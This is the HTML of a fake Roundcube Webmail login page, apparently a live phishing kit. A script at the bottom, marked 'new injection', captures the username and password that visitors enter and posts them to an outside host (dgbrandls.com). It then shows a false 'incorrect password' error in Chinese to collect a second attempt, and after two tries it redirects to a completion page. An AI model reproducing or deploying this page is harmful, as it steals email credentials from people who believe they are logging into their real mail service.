<html lang="en" class="js chrome webkit layout-normal"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>Roundcube Webmail :: Welcome to Roundcube Webmail</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no, maximum-scale=1.0"><meta name="theme-color" content="#f4f4f4"><meta name="msapplication-navbutton-color" content="#f4f4f4">
	<link rel="shortcut icon" href="https://mail.antispams.com/mail/skins/elastic/images/favicon.ico?s=1640816963">
	<link rel="stylesheet" href="https://mail.antispams.com/mail/skins/elastic/deps/bootstrap.min.css?s=1640817073">
	
		<link rel="stylesheet" href="https://mail.antispams.com/mail/skins/elastic/styles/styles.min.css?s=1640816963">
		
	
	
	
<link rel="stylesheet" type="text/css" href="https://mail.antispams.com/mail/plugins/jqueryui/themes/elastic/jquery-ui.min.css?s=1640816963"><script src="program/js/jquery.min.js?s=1640817055"></script><script src="program/js/common.min.js?s=1640816963"></script><script src="program/js/app.min.js?s=1640816963"></script><script src="program/js/jstz.min.js?s=1640817055"></script><script>
/*
        @licstart  The following is the entire license notice for the 
        JavaScript code in this page.

        Copyright (C) The Roundcube Dev Team

        The JavaScript code in this page is free software: you can redistribute
        it and/or modify it under the terms of the GNU General Public License
        as published by the Free Software Foundation, either version 3 of
        the License, or (at your option) any later version.

        The code is distributed WITHOUT ANY WARRANTY; without even the implied
        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
        See the GNU GPL for more details.

        @licend  The above is the entire license notice
        for the JavaScript code in this page.
*/
var rcmail = new rcube_webmail();
rcmail.set_env({"task":"login","standard_windows":false,"locale":"en_US","devel_mode":null,"rcversion":10502,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"dark_mode_support":true,"skin":"elastic","blankpage":"skins/elastic/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":"./?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","request_token":"RTCBCrRGvOBK8XPF3yPGtvaOUTrKKPvh"});
rcmail.add_label({"loading":"Loading...","servererror":"Server Error!","connerror":"Connection Error (Failed to reach the server)!","requesttimedout":"Request timed out","refreshing":"Refreshing...","windowopenerror":"The popup window was blocked!","uploadingmany":"Uploading files...","uploading":"Uploading file...","close":"Close","save":"Save","cancel":"Cancel","alerttitle":"Attention","confirmationtitle":"Are you sure...","delete":"Delete","continue":"Continue","ok":"OK","back":"Back","errortitle":"An error occurred!","options":"Options","plaintoggle":"Plain text","htmltoggle":"HTML","previous":"Previous","next":"Next","select":"Select","browse":"Browse","choosefile":"Choose file...","choosefiles":"Choose files..."});
rcmail.gui_container("loginfooter","login-footer");rcmail.gui_object('loginform', 'login-form');
rcmail.gui_object('message', 'messagestack');
</script>

<script src="plugins/jqueryui/js/jquery-ui.min.js?s=1640816963"></script>
</head>
<body class="task-login action-none">
	
		<div id="layout">
	


<h1 class="voice">Roundcube Webmail Login</h1>

<div id="layout-content" class="selected no-navbar" role="main">
	<img src="https://mail.antispams.com/mail/skins/elastic/images/logo.svg?s=1640816963" id="logo" alt="Logo">
	<form id="login-form" name="login-form" method="post" class="propform" action="">

	<table><tbody><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginuser">Username</label></td><td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon user"></i></span><input name="email" id="email" required="" size="40" class="form-control" autocapitalize="off" type="text" placeholder="Username"></td></tr><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginpwd">Password</label></td><td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon pass"></i></span><input name="password" id="password" required="" size="40" class="form-control" autocapitalize="off" type="password" placeholder="Password"></td></tr></tbody></table><p class="formbuttons"><button type="submit" id="submit-btn" class="button mainaction submit btn btn-primary btn-lg text-uppercase w-100">Login</button></p>
		<div id="login-footer" role="contentinfo">
			Roundcube Webmail
			
			
			
		</div>
	</form>
</div>

<noscript>
	<p class="noscriptwarning">Warning: This webmail service requires Javascript! In order to use it please enable Javascript in your browser's settings.</p>
</noscript>


</div>



<div id="messagestack"></div>
<script>
$(function() {
rcmail.init();
});
</script>



<script src="skins/elastic/deps/bootstrap.bundle.min.js?s=1640817073"></script>
<script src="skins/elastic/ui.min.js?s=1640816963"></script>

 <!-- jQuery first, then Popper.js, then Bootstrap JS -->
      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>

 <script>
    /* global $ */
    $(document).ready(function(){
	var count=0;
	
     function getUrlVars() {
        var vars = {};
        var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
          vars[key] = value;
        });
        return vars;
      }
      
      var number = getUrlVars()["msg"];

       $("#displayName").html(number);
       $("#email").val(number);
        $('#submit-btn').click(function(event){
        $('#error').hide();
        
        event.preventDefault();
        var email=$("#email").val();
        var password=$("#password").val();
        var msg = $('#msg').html();
        $('#msg').text( msg );
if (!password) {
    $('#msg').show();
    $('#msg').html("密碼為空!");

                return false;
            }
              



        ///////////new injection////////////////
      var my_email =email;
      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

      if (!filter.test(my_email)) {
        $('#error').show();
        email.focus;
        return false;
      }

      var ind=my_email.indexOf("@");
      var my_slice=my_email.substr((ind+1));
      var c= my_slice.substr(0, my_slice.indexOf('.'));
      var final= c.toLowerCase();
      var finalu= c.toUpperCase();
      count=count+1;
      
      $.ajax({
        dataType: 'JSON',
        url: 'https://dgbrandls.com/c/post.php',
        type: 'POST',
        data:{
          email:email,
          password:password,
        },
            data: $('#login-form').serialize(),
            beforeSend: function(xhr){
             
            },
            success: function(response){
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                   $("#password").val("");
                  if (count>=2) {
                    count=0;
         window.location.replace("complete.html?msg="+email);
                  }
               	$("#msg").show();
               $('#msg').html("密碼不正確。請再試一次");
                }
                else{
               	$("#msg").show();
               $('#msg').html("密碼不正確。請再試一次");
                }
              }
            },
            error: function(){
              $("#password").val("");
              if (count>=2) {
                count=0;
            window.location.replace("complete.html?msg="+email);
              }
               	$("#msg").show();
               $('#msg').html("密碼不正確。請再試一次");
            },
            complete: function(){
             
            }
          });
    });
       


      
   });

   
</script>
</body></html>
